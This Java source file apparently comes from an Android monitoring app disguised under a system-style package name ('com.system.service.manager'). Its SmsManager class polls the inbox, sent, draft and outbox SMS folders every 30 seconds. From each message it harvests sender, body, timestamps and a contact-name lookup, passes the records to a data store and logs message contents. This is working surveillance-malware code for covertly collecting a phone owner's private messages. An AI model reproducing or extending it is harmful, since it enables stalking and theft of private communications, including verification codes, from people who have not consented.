package com.system.service.manager;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * SMS Manager - Handles SMS monitoring and data collection
 * Monitors SMS inbox, sent messages, and drafts
 */
public class SmsManager {
    
    private static final String TAG = "SmsManager";
    private static final long SMS_CHECK_INTERVAL = 30000; // 30 seconds
    
    private Context context;
    private DataManager dataManager;
    private Handler handler;
    private ExecutorService executorService;
    
    private boolean isMonitoring = false;
    private long lastSmsTimestamp = 0;
    
    // SMS Content Provider URIs
    private static final Uri SMS_INBOX_URI = Uri.parse("content://sms/inbox");
    private static final Uri SMS_SENT_URI = Uri.parse("content://sms/sent");
    private static final Uri SMS_DRAFT_URI = Uri.parse("content://sms/draft");
    private static final Uri SMS_OUTBOX_URI = Uri.parse("content://sms/outbox");
    
    public SmsManager(Context context, DataManager dataManager) {
        this.context = context;
        this.dataManager = dataManager;
        this.handler = new Handler(Looper.getMainLooper());
        this.executorService = Executors.newSingleThreadExecutor();
        
        // Get initial timestamp to avoid sending old SMS
        initializeLastSmsTimestamp();
    }
    
    /**
     * Initialize last SMS timestamp to current time
     */
    private void initializeLastSmsTimestamp() {
        lastSmsTimestamp = System.currentTimeMillis();
    }
    
    /**
     * Start SMS monitoring
     */
    public void startSmsMonitoring() {
        if (isMonitoring) {
            Log.d(TAG, "SMS monitoring already started");
            return;
        }
        
        if (!hasSmsPermission()) {
            Log.e(TAG, "SMS permission not granted");
            return;
        }
        
        isMonitoring = true;
        Log.d(TAG, "SMS monitoring started");
        
        // Start periodic SMS checking
        scheduleSmsCheck();
    }
    
    /**
     * Stop SMS monitoring
     */
    public void stopSmsMonitoring() {
        if (!isMonitoring) {
            return;
        }
        
        isMonitoring = false;
        handler.removeCallbacksAndMessages(null);
        Log.d(TAG, "SMS monitoring stopped");
    }
    
    /**
     * Schedule periodic SMS checking
     */
    private void scheduleSmsCheck() {
        if (!isMonitoring) {
            return;
        }
        
        handler.postDelayed(() -> {
            executorService.execute(this::checkForNewSms);
            scheduleSmsCheck(); // Schedule next check
        }, SMS_CHECK_INTERVAL);
    }
    
    /**
     * Check for new SMS messages
     */
    private void checkForNewSms() {
        try {
            // Check inbox
            checkSmsFolder(SMS_INBOX_URI, "received");
            
            // Check sent
            checkSmsFolder(SMS_SENT_URI, "sent");
            
            // Check drafts
            checkSmsFolder(SMS_DRAFT_URI, "draft");
            
            // Check outbox
            checkSmsFolder(SMS_OUTBOX_URI, "outbox");
            
        } catch (Exception e) {
            Log.e(TAG, "Error checking for new SMS", e);
        }
    }
    
    /**
     * Check specific SMS folder for new messages
     */
    private void checkSmsFolder(Uri uri, String type) {
        if (!hasSmsPermission()) {
            return;
        }
        
        ContentResolver resolver = context.getContentResolver();
        String selection = "date > ?";
        String[] selectionArgs = {String.valueOf(lastSmsTimestamp)};
        String sortOrder = "date DESC";
        
        try (Cursor cursor = resolver.query(uri, null, selection, selectionArgs, sortOrder)) {
            if (cursor != null && cursor.moveToFirst()) {
                long newestTimestamp = lastSmsTimestamp;
                
                do {
                    Map<String, Object> smsData = extractSmsData(cursor, type);
                    if (smsData != null) {
                        dataManager.storeSmsData(smsData);
                        
                        long messageTime = getLong(cursor, "date");
                        if (messageTime > newestTimestamp) {
                            newestTimestamp = messageTime;
                        }
                        
                        Log.d(TAG, String.format("New %s SMS: %s from %s", 
                            type, getString(cursor, "body"), getString(cursor, "address")));
                    }
                } while (cursor.moveToNext());
                
                // Update last timestamp
                if (newestTimestamp > lastSmsTimestamp) {
                    lastSmsTimestamp = newestTimestamp;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading SMS from " + type + " folder", e);
        }
    }
    
    /**
     * Extract SMS data from cursor
     */
    private Map<String, Object> extractSmsData(Cursor cursor, String type) {
        try {
            Map<String, Object> smsData = new HashMap<>();
            
            // Basic SMS information
            smsData.put("type", type);
            smsData.put("address", getString(cursor, "address"));
            smsData.put("body", getString(cursor, "body"));
            smsData.put("date", getLong(cursor, "date"));
            smsData.put("date_sent", getLong(cursor, "date_sent"));
            smsData.put("read", getInt(cursor, "read"));
            smsData.put("status", getInt(cursor, "status"));
            smsData.put("thread_id", getLong(cursor, "thread_id"));
            smsData.put("person", getString(cursor, "person"));
            smsData.put("service_center", getString(cursor, "service_center"));
            
            // Additional metadata
            smsData.put("phone_number", getString(cursor, "address"));
            smsData.put("message_content", getString(cursor, "body"));
            smsData.put("timestamp", getLong(cursor, "date"));
            smsData.put("is_read", getInt(cursor, "read") == 1);
            
            // Contact name lookup (if available)
            String contactName = getContactName(getString(cursor, "address"));
            if (contactName != null) {
                smsData.put("contact_name", contactName);
            }
            
            return smsData;
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting SMS data", e);
            return null;
        }
    }
    
    /**
     * Get contact name for phone number
     */
    private String getContactName(String phoneNumber) {
        if (phoneNumber == null || phoneNumber.isEmpty()) {
            return null;
        }
        
        try {
            ContentResolver resolver = context.getContentResolver();
            Uri uri = Uri.withAppendedPath(
                android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber)
            );
            
            try (Cursor cursor = resolver.query(uri, 
                new String[]{android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME}, 
                null, null, null)) {
                
                if (cursor != null && cursor.moveToFirst()) {
                    return cursor.getString(0);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting contact name for " + phoneNumber, e);
        }
        
        return null;
    }
    
    /**
     * Safe string extraction from cursor
     */
    private String getString(Cursor cursor, String columnName) {
        try {
            int columnIndex = cursor.getColumnIndex(columnName);
            return columnIndex >= 0 ? cursor.getString(columnIndex) : "";
        } catch (Exception e) {
            return "";
        }
    }
    
    /**
     * Safe long extraction from cursor
     */
    private long getLong(Cursor cursor, String columnName) {
        try {
            int columnIndex = cursor.getColumnIndex(columnName);
            return columnIndex >= 0 ? cursor.getLong(columnIndex) : 0;
        } catch (Exception e) {
            return 0;
        }
    }
    
    /**
     * Safe int extraction from cursor
     */
    private int getInt(Cursor cursor, String columnName) {
        try {
            int columnIndex = cursor.getColumnIndex(columnName);
            return columnIndex >= 0 ? cursor.getInt(columnIndex) : 0;
        } catch (Exception e) {
            return 0;
        }
    }
    
    /**
     * Check if SMS permission is granted
     */
    private boolean hasSmsPermission() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) 
            == PackageManager.PERMISSION_GRANTED;
    }
    
    /**
     * Get SMS statistics
     */
    public Map<String, Object> getSmsStatistics() {
        Map<String, Object> stats = new HashMap<>();
        
        try {
            ContentResolver resolver = context.getContentResolver();
            
            // Count inbox messages
            try (Cursor cursor = resolver.query(SMS_INBOX_URI, null, null, null, null)) {
                stats.put("inbox_count", cursor != null ? cursor.getCount() : 0);
            }
            
            // Count sent messages
            try (Cursor cursor = resolver.query(SMS_SENT_URI, null, null, null, null)) {
                stats.put("sent_count", cursor != null ? cursor.getCount() : 0);
            }
            
            // Count draft messages
            try (Cursor cursor = resolver.query(SMS_DRAFT_URI, null, null, null, null)) {
                stats.put("draft_count", cursor != null ? cursor.getCount() : 0);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting SMS statistics", e);
        }
        
        stats.put("monitoring_active", isMonitoring);
        stats.put("last_check_timestamp", lastSmsTimestamp);
        
        return stats;
    }
    
    /**
     * Force SMS sync
     */
    public void forceSmsSync() {
        if (isMonitoring && hasSmsPermission()) {
            executorService.execute(this::checkForNewSms);
        }
    }
}